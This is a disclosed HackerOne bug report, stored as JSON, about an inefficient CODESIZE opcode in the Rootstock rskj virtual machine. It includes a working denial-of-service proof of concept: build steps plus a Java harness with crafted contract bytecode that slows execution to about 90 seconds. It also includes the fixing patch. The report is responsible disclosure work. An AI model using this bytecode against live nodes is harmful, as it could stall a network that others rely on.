@@ -1,0 +1,123 @@
+{
+  "id": 2489843,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNDg5ODQz",
+  "url": "https://hackerone.com/reports/2489843",
+  "title": "Crafted smart contract can take 1.5 minutes to execute due to inefficient CODESIZE implementation",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2024-05-03T20:23:21.700Z",
+  "submitted_at": "2024-05-03T20:23:21.968Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "guido",
+    "url": "/guido",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/002/983/e55b0b2324777fb7efc2de4212fd8d337ca816bd_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 25854,
+    "url": "https://hackerone.com/rootstocklabs",
+    "handle": "rootstocklabs",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/7q67oftq9lv3d00bgl62x7sn1j6e/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/7q67oftq9lv3d00bgl62x7sn1j6e/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "disabled",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Rootstock Labs",
+      "twitter_handle": "rootstocklabs",
+      "website": "https://rootstocklabs.com",
+      "about": "Make Bitcoin work for everyone"
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2025-06-12T18:52:48.849Z",
+  "bug_reporter_agreed_on_going_public_at": "2025-06-12T18:52:48.278Z",
+  "team_member_agreed_on_going_public_at": "2025-06-10T15:14:11.041Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary:\nTLDR: `VM.doCODESIZE()` is inefficient which can lead to slow executions.\n\n`VM.doCODESIZE()` retrieves the code size by calling `Program.getCode()`, and then invoking the `length` property on the return value:\n\n```java\n    protected void doCODESIZE() {\n        if (computeGas) {\n            if (op == OpCode.EXTCODESIZE) {\n                gasCost = GasCost.EXT_CODE_SIZE;\n            }\n            spendOpCodeGas();\n        }\n        // EXECUTION PHASE\n        DataWord codeLength;\n        if (op == OpCode.CODESIZE) {\n            codeLength = DataWord.valueOf(program.getCode().length); // during initialization it will return the initialization code size\n```\n\nThis means that `program.getCode()` returns the entire byte array each time `CODESIZE` is invoked. This property can be exploited to transfer immense amounts of data between `Program.getCode()` and `VM.doCODESIZE()`, such as over 1 terabyte in aggregate in the reproducer below, which makes execution very slow.\n\n## Steps To Reproduce:\n\nReproducer (tested on Linux x64):\n\n```sh\nwget -q https://download.java.net/java/GA/jdk11/9/GPL/openjdk-11.0.2_linux-x64_bin.tar.gz\ntar zxf openjdk-11.0.2_linux-x64_bin.tar.gz\nexport JAVA_HOME=$(realpath jdk-11.0.2/)\ngit clone --depth 1 https://github.com/rsksmart/rskj.git\ncd rskj/\necho \"task testJar(type: Jar) {\" >>rskj-core/build.gradle\necho \"    from sourceSets.test.output\" >>rskj-core/build.gradle\necho \"    classifier = 'tests'\" >>rskj-core/build.gradle\necho \"}\" >>rskj-core/build.gradle\necho \"assemble.dependsOn(testJar)\" >>rskj-core/build.gradle\n./configure.sh\n# Build rskj\n./gradlew assemble\n# Construct reproducer\necho \"\"\"\nimport co.rsk.config.TestSystemProperties;\nimport co.rsk.config.VmConfig;\nimport java.util.HashSet;\nimport javax.xml.bind.DatatypeConverter;\nimport org.ethereum.config.blockchain.upgrades.ActivationConfig;\nimport org.ethereum.config.blockchain.upgrades.ActivationConfigsForTest;\nimport org.ethereum.core.BlockFactory;\nimport org.ethereum.core.BlockTxSignatureCache;\nimport org.ethereum.core.ReceivedTxSignatureCache;\nimport org.ethereum.vm.*;\nimport org.ethereum.vm.program.Program;\nimport org.ethereum.vm.program.invoke.ProgramInvokeMockImpl;\n\npublic class Poc {\n    public static void main(String[] args) {\n        TestSystemProperties config = new TestSystemProperties();\n        PrecompiledContracts precompiledContracts = new PrecompiledContracts(config, null, new BlockTxSignatureCache(new ReceivedTxSignatureCache()));\n        BlockFactory blockFactory = new BlockFactory(config.getActivationConfig());\n        VmConfig vmConfig = config.getVmConfig();\n        ProgramInvokeMockImpl invoke = new ProgramInvokeMockImpl();\n        ActivationConfig.ForBlock activations = ActivationConfigsForTest.arrowhead600().forBlock(0);\n        invoke.setGas(6800000); /* block limit */\n\n        byte[] code = DatatypeConverter.parseHexBinary(\n                \\\"5b38385038385038385038503838385038385038383838385050383850503838\\\" +\n                \\\"3838385050385050383850503838503838505050383850503850503850503850\\\" +\n                \\\"3850503850383850383838503838385050383838503850385050503850383850\\\" +\n                \\\"3838503838505038385038383838503838385050385038385038383850383850\\\" +\n                \\\"5038383850503838503850383850503850385050385038385038383850383838\\\" +\n                \\\"3850503850385050385038503850385050385038385038383850383838505038\\\" +\n                \\\"5038385038385050383838503850385038385038383850503850385050385038\\\" +\n                \\\"3850383838503838505038503850503850383850383838503838383850503850\\\" +\n                \\\"3850503850385038503850503850383850383838503838385050385038385038\\\" +\n                \\\"3850503838385038503850383850383838505038503850503850383850383838\\\" +\n                \\\"5038383850503850383850385050383850503850503850503850385050385038\\\" +\n                \\\"3850383838503838385050383850503850503850385050385038503838385038\\\" +\n                \\\"3850503838383850385038385050383838503850385050385038385050385050\\\" +\n                \\\"3850385038385038503850383850385038383850383850503850383850383838\\\" +\n                \\\"5038383850385038505038503838505038505038503838505038505038503850\\\" +\n                \\\"3838385038385050383850383838503850383850503850385050385038385038\\\" +\n                \\\"3838503838383850503838385050385038503850385038385038385038383838\\\" +\n                \\\"3838385050385038383838383838503850503850383850383838503838383838\\\" +\n                \\\"5038505038505038505038503850383838503838505038385038383850385038\\\" +\n                \\\"3850503850385050385038385038383850383838385050385038505038503850\\\" +\n                \\\"3850385038385038385038383850383838505038503838505050383850503850\\\" +\n                \\\"5038503838505050383850383850383850385050385050385050385038505038\\\" +\n                \\\"5038385038383850383838505038385050385050385050385038503838385038\\\" +\n                \\\"3850383838383850385038385050383838503850385050385038385050503850\\\" +\n                \\\"3850503850383850383838503838503838383838385038503838503850505038\\\" +\n                \\\"5050385038385050383838503838503838385050383838383850383838503850\\\" +\n                \\\"3850503850383838503850503850383838385050385050383838503850503850\\\" +\n                \\\"3838383850383838503838503850383850385050503850503850383850505038\\\" +\n                \\\"3850383850383838505050505050385038505038505038503838503838505038\\\" +\n                \\\"3838503850385050385038385050385050385038385038503850505038505038\\\" +\n                \\\"5038505050503838503838505050383850503850503838505038503850505050\\\" +\n                \\\"5038383850383850503850503850385050385050503838385038385050385050\\\" +\n                \\\"3850385050383850385050505050383838503838505038505050385038503850\\\" +\n                \\\"5050383850503850385050385050385050505038503850383850503850385050\\\" +\n                \\\"3850503838505038503838503838385050385038385038505038505038503850\\\" +\n                \\\"5038505050383850505050383850503850503850503850385050385038383850\\\" +\n                \\\"3850505050385038505038503850383850503850385050385050385038385038\\\" +\n                \\\"3850385038503838503850503850503850385050385038503838505050503838\\\" +\n                \\\"5038385038383850505050505038503850503850503850383850383850503838\\\" +\n                \\\"3850385038505038503838505038505038503838503850385050503850503850\\\" +\n                \\\"3850505050383850383850505038385050385050383850503850385050505050\\\" +\n                \\\"3838385038385050385050385038505038505050383838503838505038505038\\\" +\n                \\\"5038505038385038505050505038383850383850503850505038503850385050\\\" +\n                \\\"5038385050385038505038505038385038385050503838505038505038505038\\\" +\n                \\\"5038505038503838503838385038383850503838505038505038505038503850\\\" +\n                \\\"3838385038385050503850383850503850503850383850505038385038385050\\\" +\n                \\\"5038385050385038385050385050385038385050503838503838505050383850\\\" +\n                \\\"5038505038505038503850503850383850383838503838385050383850503850\\\" +\n                \\\"5038505038503850383838505050385038383838503850383850505050385050\\\" +\n                \\\"5038385050383850505038385050385050503838383850385038385050385038\\\" +\n                \\\"5050503850505038385050503850505038505038505038503850503850385038\\\" +\n                \\\"5050503838505038503850503850503850385050385038503838505038503850\\\" +\n                \\\"5038505038385050385038385038383850503850383850385050385050385038\\\" +\n                \\\"5050385038503838505050503838505038505038505038503850503850383838\\\" +\n                \\\"5038505050503850385050385038385050505038503850503850503850383850\\\" +\n                \\\"3838503850385038385038505038505038503850503850385038385050505038\\\" +\n                \\\"3850503850503850503850385050385038383850385050385038503850503838\\\" +\n                \\\"5050383838503850503838503850505038385050385050505050385038505038\\\" +\n                \\\"5050385038505038503850383850505050383850503850503850503850385050\\\" +\n                \\\"3850383838503850503850385038505038385050383838503850505038383850\\\" +\n                \\\"5050383850503850503838505038503850505050503838385038505038503850\\\" +\n                \\\"3850505038385050503850503850383850505050503850503850503814165957\\\" +\n                \\\"3862105aff598038593d39f038503850\\\");\n\n        VM vm = new VM(vmConfig, precompiledContracts);\n        Program program = new Program(vmConfig, precompiledContracts, blockFactory, activations, code, invoke,null, new HashSet<>(), new BlockTxSignatureCache(new ReceivedTxSignatureCache()));\n\n        try {\n            while (program.isStopped() == false)\n                vm.step(program);\n        } catch (RuntimeException e) {\n            program.setRuntimeFailure(e);\n        }\n    }\n}\"\"\" >Poc.java\n# Build reproducer\n$JAVA_HOME/bin/javac -cp rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-tests.jar:rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-all.jar Poc.java\n# Run reproducer\ntime $JAVA_HOME/bin/java -cp .:rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-tests.jar:rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-all.jar Poc\n```\n\nOn my machine, this takes 1m29.355s to run.\n\nThis reproducer was constructed using a genetic algorithm and it does not necessarily represent the global maximum of number of bytes copied (that is to say, it is likely that one can construct even slower examples).\n\nThe issue can easily be fully mitigated by implementing a `getCodeLength()` method in `Program`, and calling this method from `VM.doCODESIZE()`, so that only the code length rather than the whole code array is transferred. You are hereby granted the right to apply this patch to your repository.\n\n```diff\ndiff --git a/rskj-core/src/main/java/org/ethereum/vm/VM.java b/rskj-core/src/main/java/org/ethereum/vm/VM.java\nindex 2365d38..88eb90d 100644\n--- a/rskj-core/src/main/java/org/ethereum/vm/VM.java\n+++ b/rskj-core/src/main/java/org/ethereum/vm/VM.java\n@@ -775,7 +775,7 @@ public class VM {\n         // EXECUTION PHASE\n         DataWord codeLength;\n         if (op == OpCode.CODESIZE) {\n-            codeLength = DataWord.valueOf(program.getCode().length); // during initialization it will return the initialization code size\n+            codeLength = DataWord.valueOf(program.getCodeLength()); // during initialization it will return the initialization code size\n         } else {\n             DataWord address = program.stackPop();\n             codeLength = DataWord.valueOf(program.getCodeLengthAt(address));\ndiff --git a/rskj-core/src/main/java/org/ethereum/vm/program/Program.java b/rskj-core/src/main/java/org/ethereum/vm/program/Program.java\nindex 5a79952..35885d5 100644\n--- a/rskj-core/src/main/java/org/ethereum/vm/program/Program.java\n+++ b/rskj-core/src/main/java/org/ethereum/vm/program/Program.java\n@@ -960,6 +960,10 @@ public class Program {\n         return Arrays.copyOf(ops, ops.length);\n     }\n \n+    public int getCodeLength() {\n+        return ops.length;\n+    }\n+\n     public Keccak256 getCodeHashAt(RskAddress addr, boolean standard) {\n         if(standard) {\n             return invoke.getRepository().getCodeHashStandard(addr);\n```\n\nAfter applying this patch, build and run again:\n\n```sh\n# Build rskj\n./gradlew assemble\n# Build reproducer\n$JAVA_HOME/bin/javac -cp rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-tests.jar:rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-all.jar Poc.java\n# Run reproducer\ntime $JAVA_HOME/bin/java -cp .:rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-tests.jar:rskj-core/build/libs/rskj-core-6.2.0-SNAPSHOT-all.jar Poc\n```\n\nNow the execution time is only 0m0.755s, so over 118 times faster.\n\nThis was tested on Linux x64 (Intel(R) Core(TM) i7-8700 CPU @ 3.20GHz) using rskj at commit a61e9080ba353fcbb6f94cf4606986a88c3043e3.\n\n## Supporting Material/References:\n[list any additional material (e.g. screenshots, logs, etc.)]\n\n  * [attachment / reference]\n\n## Impact\n\n## Summary:\nStall the network.",
+  "weakness": {
+    "id": 48,
+    "name": "Uncontrolled Resource Consumption"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": null,
+  "vote_count": 30,
+  "voters": [
+    "oldrashed",
+    "zy9ard3",
+    "deel_",
+    "mohaned0101",
+    "thalaivar304",
+    "2026",
+    "guido",
+    "mr-alienx-kurd",
+    "newby99",
+    "galactuss",
+    "and 20 more..."
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "Team"
+  },
+  "structured_scope": {
+    "databaseId": 5820,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rsksmart/rskj",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
